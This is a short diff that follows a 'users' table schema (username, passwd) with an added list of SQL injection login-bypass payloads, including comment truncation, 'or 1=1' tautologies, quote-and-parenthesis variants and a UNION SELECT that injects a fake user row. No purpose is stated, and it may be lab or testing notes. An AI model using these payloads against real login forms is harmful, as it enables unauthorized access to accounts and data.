@@ -18,3 +18,25 @@ users:
 	id INTEGER PRIMARY KEY AUTOINCREMENT,
 	username varchar(100) NOT NULL,
 	passwd varchar(255) NOT NULL)
+	
+	
+	
+	
+{username}' --
+	
+{username} ' or 1=1--
+	
+	
+{username}’ or ‘x’=’x
+’ or ‘x’=’x
+	
+{username}' --
+{username}' #
+{username}'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+' UNION SELECT 1, '{username}', 'doesnt matter', 1--
